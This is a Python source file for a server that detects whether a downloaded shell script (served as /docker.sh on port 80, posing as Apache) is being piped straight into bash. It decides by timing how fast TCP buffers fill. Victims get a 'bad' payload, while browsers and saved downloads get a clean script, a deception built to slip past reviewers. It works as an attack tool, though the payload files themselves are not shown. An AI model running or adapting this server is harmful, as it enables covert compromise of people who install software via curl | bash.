import re
import socketserver
import socket
import ssl
import time
from numpy import std


class MoguiServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """HTTP server to detect curl | bash"""

    daemon_threads = True
    allow_reuse_address = True
    payloads = {}
    ssl_options = None

    def __init__(self, server_address):
        """Accepts a tuple of (HOST, PORT)"""

        # Socket timeout
        self.socket_timeout = 10

        # Outbound tcp socket buffer size
        self.buffer_size = 87380

        # What to fill the tcp buffers with
        self.padding = chr(0) * (self.buffer_size)

        # Maximum number of blocks of padding - this
        # shouldn't need to be adjusted but may need to be increased
        # if its not working.
        self.max_padding = 64

        # HTTP 200 status code
        self.packet_200 = (
            "HTTP/1.1 200 OK\r\n"
            + "Server: Apache\r\n"
            + "Date: %s\r\n"
            + "Content-Type: text/plain; charset=us-ascii\r\n"
            + "Transfer-Encoding: chunked\r\n"
            + "Connection: keep-alive\r\n\r\n"
        ) % time.ctime(time.time())

        socketserver.TCPServer.__init__(self, server_address, HTTPHandler)

    def setscript(self, uri, params):
        """Sets parameters for each URI"""

        (null, good, bad, min_jump, max_variance) = params

        null = open(null, "r").read()  # Base file with a delay
        good = open(good, "r").read()  # Non malicious payload
        bad = open(bad, "r").read()  # Malicious payload

        self.payloads[uri] = (null, good, bad, min_jump, max_variance)


class HTTPHandler(socketserver.BaseRequestHandler):
    """Socket handler for MoguiServer"""

    def sendchunk(self, text):
        """Sends a single HTTP chunk"""

        self.request.sendall(b"%s\r\n" % hex(len(text))[2:].encode())
        self.request.sendall(text.encode())
        self.request.sendall(b"\r\n")

    def log(self, msg):
        """Writes output to stdout"""

        print("[%s] %s %s" % (time.time(), self.client_address[0], msg))

    def handle(self):
        """Handles inbound TCP connections from MoguiServer"""

        # If the two packets are transmitted with a difference in time
        # of min_jump and the remaining packets have a time difference with
        # a variance of less then min_var the output has been piped
        # via bash.

        self.log("Inbound request")

        # Setup socket options

        self.request.settimeout(self.server.socket_timeout)
        self.request.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.request.setsockopt(
            socket.SOL_SOCKET, socket.SO_SNDBUF, self.server.buffer_size
        )

        # Parse the HTTP request

        data = None

        try:
            data = self.request.recv(1024)
        except socket.error:
            self.log("No data received")
            return

        uri = re.search("^GET ([^ ]+) HTTP/1.[0-9]", data.decode())

        if not uri:
            self.log("HTTP request malformed.")
            return

        request_uri = uri.group(1)
        self.log("Request for shell script %s" % request_uri)

        if request_uri not in self.server.payloads:
            index = open("index.html","r").read()
            to_send = ("HTTP/1.1 200 OK\r\n"
            + "Server: Apache\r\n"
            + f"Date: {time.ctime(time.time())}\r\n"
            + "Content-Type: text/html\r\n"
            + f"Content-Length: {len(index)}\r\n"
            + "Connection: keep-alive\r\n\r\n")
            to_send += index
            self.request.sendall(to_send.encode())
            self.log("No payload found for %s" % request_uri)
            return

        # Return 200 status code

        self.request.sendall(self.server.packet_200.encode())

        (
            payload_plain,
            payload_good,
            payload_bad,
            min_jump,
            max_var,
        ) = self.server.payloads[request_uri]

        if not re.search("User-Agent: (curl|Wget)", data.decode(), re.IGNORECASE):
            self.sendchunk(payload_good)
            self.sendchunk("")
            self.log("Request not via wget/curl. Returning good payload.")
            return

        # Send plain payload
        timing = []
        stime = time.time()

        self.sendchunk(payload_plain)        

        for i in range(0, self.server.max_padding):
            self.sendchunk(self.server.padding)
            timing.append(time.time() - stime)
        
        # Payload choice
        if timing[-1] > 10:
            self.log("Execution through bash detected - sending bad payload :D")
            self.sendchunk(payload_bad)
        else:
            self.log("Sending good payload :(")
            self.sendchunk(payload_good)

        self.sendchunk("")
        self.log("Connection closed.")


if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 80

    SERVER = MoguiServer((HOST, PORT))
    SERVER.setscript("/docker.sh", ("ticker.sh", "good.sh", "bad.sh", 2.0, 0.1))

    print("Listening on %s %s" % (HOST, PORT))
    SERVER.serve_forever()
